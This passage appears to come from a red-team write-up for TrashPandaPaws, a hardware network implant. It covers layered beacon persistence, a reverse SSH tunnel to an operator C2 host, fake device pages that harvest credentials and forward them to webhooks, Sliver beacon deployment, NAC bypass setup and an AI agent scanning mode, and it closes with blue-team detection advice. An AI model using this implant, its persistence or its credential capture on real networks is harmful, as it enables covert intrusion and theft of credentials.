Two traps worth knowing before you try it. `RACCOON_TOKEN` must be fixed: left unset, the C2 invents a random operator token at every start, the agent authenticates with that token, and every call comes back 401 while the GUI simply reports the feature unavailable. And `configs/raccoon.yaml` ships with `c2.sliver.enabled: true`, which means the box checks in with the Sliver server and never with the Raccoon team server — so the agent, which plans against what the team server knows, would be looking at an empty fleet. Set it to `false` for an agent run. The full configuration guide with the measured numbers, the scope rules, and a troubleshooting table of the traps that actually cost time is in [`docs/AGENT.md`](https://github.com/BenjiTrapp/TrashPandaPaws/blob/main/docs/AGENT.md).

## Multi Layer Persistence

The beacon must survive reboots, service crashes, and partial remediation. TrashPandaPaws uses five independent persistence mechanisms with a PID lock to prevent duplicate execution:

| Layer | Trigger | Delay |
|-------|---------|-------|
| systemd service | `raccoon-beacon.service` | 30 seconds |
| crontab | `@reboot` | 45 seconds |
| rc.local | Boot script | 60 seconds |
| udev rule | `eth0` link up event | 30 seconds |
| systemd timer | Watchdog every 5 minutes | Continuous |

The first layer to start acquires a PID lock at `/tmp/.raccoon_beacon.pid`. All other layers check the lock and exit silently if the beacon is already running. The systemd timer acts as a watchdog: if all five instances die, the timer restarts the beacon within five minutes.

<pre class="mermaid">
flowchart TD
    BOOT["System boot"] --> SD["systemd service\n30s delay"]
    BOOT --> CRON["crontab @reboot\n45s delay"]
    BOOT --> RC["rc.local\n60s delay"]
    NET["eth0 up"] --> UDEV["udev rule\n30s delay"]

    SD --> LOCK{"/tmp/.raccoon_beacon.pid\nacquire lock?"}
    CRON --> LOCK
    RC --> LOCK
    UDEV --> LOCK

    LOCK -->|First wins| RUN["Beacon running"]
    LOCK -->|Lock held| EXIT["Exit silently"]

    TIMER["systemd timer\nevery 5 min"] --> CHECK{"Beacon alive?"}
    CHECK -->|No| RESTART["Restart beacon"]
    CHECK -->|Yes| WAIT["Sleep 5 min"]
</pre>

Staggered delays ensure the five layers do not race. The first layer to reach the lock wins, and the rest back off.

## Remote Access

Beyond C2, the implant provides two direct access methods for interactive work.

**SSH Reverse Tunnel** uses `autossh` to maintain a persistent reverse tunnel to the operator's server. The operator connects through the tunnel without needing inbound access to the target network:

```bash
# On the operator side
ssh -p 2222 root@localhost
```

**VNC Server** runs a headless `x11vnc` instance accessible only through the SSH tunnel. This provides a graphical desktop for tools that need a GUI, without exposing VNC to the network.

```bash
# Forward VNC through the tunnel from the operator server
ssh -p 2222 -L 5900:127.0.0.1:5900 root@localhost
```

Both are installed and managed by `remote_access.sh`, which generates the keypair and prints the public key to drop onto the operator server:

```bash
sudo ./software/setup/remote_access.sh install
sudo ./software/setup/remote_access.sh show-pubkey
sudo ./software/setup/remote_access.sh status
```

```yaml
remote_access:
  ssh:
    ssh_enabled: true
    ssh_remote_host: "c2.example.com"
    ssh_remote_user: "raccoon"
    ssh_tunnel_port: 2222
    ssh_key_type: "ed25519"
  vnc:
    vnc_enabled: false
    vnc_port: 5900
    vnc_password: "raccoon"
    vnc_resolution: "1024x768"
```

## Credential Capture and Notifications

Both cover identities harvest credentials from anyone who interacts with them. HTTP Basic Authentication attempts, Telnet login sequences, and browser fingerprints are all logged locally and forwarded to the operator in real time via webhooks.

```yaml
notifications:
  enabled: true
  slack:
    enabled: true
    webhook_url: "https://hooks.slack.com/services/T.../B.../xxx"
  discord:
    enabled: true
    webhook_url: "https://discord.com/api/webhooks/123/abc"
  teams:
    enabled: true
    webhook_url: "https://tenant.webhook.office.com/webhookb2/..."
```

When someone browses to the fake printer page and enters credentials, the implant captures the attempt, logs it with a Cisco IOS style timestamp, and pushes a notification to the operator's Slack, Discord, or Teams channel within seconds.

## Quick Start

### Lite Variant (No Soldering)

The off the shelf build is three commands and a reboot. Flash ParrotOS, boot the Pi with the USB Ethernet adapter attached, then:

```bash
sudo ./software/setup/bootstrap.sh
sudo ./software/setup/configure_bridge.sh
sudo ./services/install.sh
sudo reboot
```

Connect the UniFi switch uplink to the target network, the Pi to port 2, and the target device to port 3.

### Image Builder (Recommended)

The fastest path to a deployment ready SD card is the image builder. It downloads ParrotOS ARM64, injects the Raccoon software and config, and creates a first boot provisioning service that installs dependencies, configures networking, and enables services automatically:

```bash
sudo ./software/setup/build_image.sh /dev/sdX
sudo ./software/setup/build_image.sh /dev/sdX --wifi MyNetwork:MyPassword
sudo ./software/setup/build_image.sh /dev/sdX --config /path/to/raccoon.yaml \
  --user operator:secret --wifi FieldOps:hunter2

# Build the image without flashing anything
sudo ./software/setup/build_image.sh --no-flash
```

Insert the card, power on, and wait about five minutes for the first boot to finish.

### Team Server

On the operator side the team server runs natively or in Docker. The launcher checks and installs its dependencies, then prompts for host, port, encryption key, and operator token:

```bash
cd software/c2
./start_server.sh            # Linux / macOS
.\start_server.ps1           # Windows PowerShell
```

### Manual Setup

For manual installation on an existing ParrotOS ARM64 system, four commands handle everything:

```bash
# Install dependencies and harden the OS
sudo ./software/setup/bootstrap.sh

# Configure the L2 bridge between eth0 and eth1
sudo ./software/setup/configure_bridge.sh

# Install systemd services and all persistence layers
sudo ./services/install.sh

# Activate everything
sudo reboot
```

### Sliver Deployment

The `deploy_sliver.sh` script automates generating and deploying the Sliver beacon binary:

```bash
./software/setup/deploy_sliver.sh generate           # interactive
./software/setup/deploy_sliver.sh generate-auto c2.example.com
./software/setup/deploy_sliver.sh deploy 192.168.1.100
./software/setup/deploy_sliver.sh full c2.example.com 192.168.1.100
```

### NAC Bypass Setup

The NAC bypass can be configured and monitored independently:

```bash
sudo ./software/setup/nac_bypass.sh setup
sudo ./software/setup/nac_bypass.sh status
```

After reboot, the C2 beacon starts automatically via the five persistence layers. No manual intervention required.

For development and testing without hardware, a local test server runs the cover identities on unprivileged ports:

```bash
python -m software.tests.test_server                  # Both covers
python -m software.tests.test_server --cover cisco     # Cisco only
python -m software.tests.test_server --cover printer   # HP only
```

The test server uses port 8080/8081 for HTTP and 15060 for SIP, so no root required.

## Detection and Defense

From a blue team perspective, inline implants are detectable if you know what to look for.

| Control | What It Does |
|---------|-------------|
| **802.1X with MACsec** | MACsec encrypts the link layer, so a passive bridge cannot read or inject traffic |
| **Port security** | Limit MAC addresses per port and alert on new MACs appearing downstream |
| **DHCP snooping** | Detect rogue DHCP or unexpected ARP patterns from the bridge |
| **Network device inventory** | Continuously scan for devices and flag anything not in the asset database |
| **PoE monitoring** | Watch for unexpected PoE power draw changes on switch ports |
| **Physical security** | Cable locks, locked patch panels, and regular physical audits of network closets |
| **TLS inspection** | Decrypt and inspect HTTPS C2 channels at the perimeter |
| **DNS monitoring** | Flag high entropy or high volume DNS queries that indicate DNS based C2 |
| **Proxy log review** | Correlate NTLM authentications with the workstation name and the process that opened the CONNECT tunnel |
| **Scan rate anomalies** | Slow, polite, evenly paced scans from a printer or phone are still scans |

The most effective countermeasure is MACsec (IEEE 802.1AE). It provides hop by hop encryption at Layer 2, which means a transparent bridge cannot decrypt, sniff, or inject traffic even if it sits physically inline. Combined with 802.1X-2010 (which mandates MACsec key agreement), the implant is reduced to a dumb cable passthrough that cannot interact with the network at all.

Two of the newer features change the blue team picture. The egress proxy support means an authenticated corporate proxy is no longer a hard boundary, so proxy logs become a hunting ground rather than a wall: a CONNECT tunnel authenticated as a legitimate domain account but originating from a device that should never make outbound web requests is a strong signal. And the agent mode's forced scan rate limits — `nmap -T2 --max-rate 50` — are a reminder that volumetric thresholds miss patient scanning. A device that touches a thousand ports over seven minutes will not trip a rate based rule, but the *fact* that a VoIP phone is enumerating services at all should.


## Further Reading

- [TrashPandaPaws on GitHub](https://github.com/BenjiTrapp/TrashPandaPaws)
- [`docs/AGENT.md`](https://github.com/BenjiTrapp/TrashPandaPaws/blob/main/docs/AGENT.md) — the agent configuration guide with measured numbers
- [`docs/C2_DEMO.md`](https://github.com/BenjiTrapp/TrashPandaPaws/blob/main/docs/C2_DEMO.md) — the full operator GUI tour
- [`hardware/OPEN_QUESTIONS.md`](https://github.com/BenjiTrapp/TrashPandaPaws/blob/main/hardware/OPEN_QUESTIONS.md) — what the PCB design rests on and what still needs measuring
- [Sliver C2 Framework](https://github.com/BishopFox/sliver)
- [NetExec](https://github.com/Pennyw0rth/NetExec)
- [MITRE ATT&CK T1200 — Hardware Additions](https://attack.mitre.org/techniques/T1200/)
- [MITRE ATT&CK T1557 — Adversary in the Middle](https://attack.mitre.org/techniques/T1557/)
- [MITRE ATT&CK T1090.001 — Internal Proxy](https://attack.mitre.org/techniques/T1090/001/)
- [IEEE 802.1AE MACsec](https://standards.ieee.org/ieee/802.1AE/7438/)
- [RaccShells: Reverse Shells Made Simple](https://benjitrapp.github.io/2026/05/01/raccshell-generator.html)
- [RaccDrop: HTML Smuggling Made Simple](https://benjitrapp.github.io/2026/04/19/raccdrop-html-smuggling.html)
